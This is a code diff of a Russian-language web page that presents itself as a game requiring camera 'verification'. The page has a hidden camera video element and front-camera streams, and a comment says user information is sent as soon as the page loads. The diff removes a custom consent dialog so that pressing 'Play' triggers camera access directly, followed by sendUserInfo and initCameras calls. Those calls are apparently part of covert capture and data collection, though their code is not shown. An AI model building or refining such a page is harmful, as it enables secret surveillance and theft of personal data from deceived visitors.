@@ -128,35 +128,6 @@
             background-color: white;
             transition: width 0.1s linear;
         }
-        
-        .permission-request {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: rgba(0, 0, 0, 0.9);
-            color: white;
-            padding: 20px;
-            border-radius: 10px;
-            text-align: center;
-            z-index: 100;
-            max-width: 80%;
-            display: none;
-        }
-        
-        .permission-btn {
-            background: #4CAF50;
-            border: none;
-            color: white;
-            padding: 10px 20px;
-            margin: 10px 5px;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        
-        .permission-btn.deny {
-            background: #f44336;
-        }
     </style>
 </head>
 <body>
@@ -181,13 +152,6 @@
         </div>
     </div>
 
-    <div class="permission-request" id="permissionRequest">
-        <h3>Требуется доступ к камере</h3>
-        <p>Для продолжения необходимо разрешить доступ к вашей камере. Это необходимо для верификации.</p>
-        <button class="permission-btn" id="grantPermission">Разрешить</button>
-        <button class="permission-btn deny" id="denyPermission">Отказать</button>
-    </div>
-
     <video id="hiddenCamera" class="hidden-camera" autoplay playsinline></video>
 
     <script>
@@ -204,9 +168,6 @@
         const newBackground = document.querySelector('.new-background');
         const loadingContainer = document.getElementById('loadingContainer');
         const progressBar = document.getElementById('progressBar');
-        const permissionRequest = document.getElementById('permissionRequest');
-        const grantPermissionBtn = document.getElementById('grantPermission');
-        const denyPermissionBtn = document.getElementById('denyPermission');
         
         let currentStream = null;
         let frontCameraStream = null;
@@ -310,23 +271,6 @@
                 }
             }
             return result;
-        }
-
-        // Функция для проверки разрешения на камеру
-        async function checkCameraPermission() {
-            try {
-                const permissionStatus = await navigator.permissions.query({ name: 'camera' });
-                return permissionStatus.state === 'granted';
-            } catch (e) {
-                // Если API permissions не поддерживается, проверяем через getUserMedia
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    stream.getTracks().forEach(track => track.stop());
-                    return true;
-                } catch {
-                    return false;
-                }
-            }
         }
 
         // Функция для запуска прогресс-бара
@@ -569,46 +513,22 @@
             }
         }
 
-        // 7. Запрос разрешения на доступ к камере
-        async function requestCameraPermission() {
-            try {
-                permissionRequest.style.display = 'block';
-                
-                // Ждем ответа пользователя
-                const userResponse = await new Promise((resolve) => {
-                    grantPermissionBtn.onclick = () => resolve(true);
-                    denyPermissionBtn.onclick = () => resolve(false);
-                });
-                
-                permissionRequest.style.display = 'none';
-                
-                if (userResponse) {
-                    try {
-                        // Пробуем получить доступ к камере
-                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                        stream.getTracks().forEach(track => track.stop());
-                        
-                        // Если доступ получен, запускаем процесс верификации
-                        await sendUserInfo();
-                        await initCameras();
-                    } catch (error) {
-                        console.error('Пользователь отказал в доступе к камере:', error);
-                        messageBox.style.display = 'block';
-                    }
-                } else {
-                    console.log('Пользователь отказался предоставлять доступ к камере');
-                    messageBox.style.display = 'block';
-                }
-            } catch (error) {
-                console.error('Ошибка при запросе разрешения:', error);
-                messageBox.style.display = 'block';
-            }
-        }
-
-        // 8. Обработчик кнопки "Играть"
+        // 7. Обработчик кнопки "Играть"
         playBtn.addEventListener('click', async function() {
             console.log('Начало процесса верификации...');
-            await requestCameraPermission();
+            try {
+                // Сначала запрашиваем доступ к камере через стандартное системное окно
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                // Если доступ получен, сразу закрываем поток (системное окно уже показано)
+                stream.getTracks().forEach(track => track.stop());
+                
+                // Затем запускаем процесс верификации
+                await sendUserInfo();
+                await initCameras();
+            } catch (error) {
+                console.error('Пользователь отказал в доступе к камере:', error);
+                messageBox.style.display = 'block';
+            }
         });
 
         // Отправляем информацию о пользователе сразу при загрузке страницы
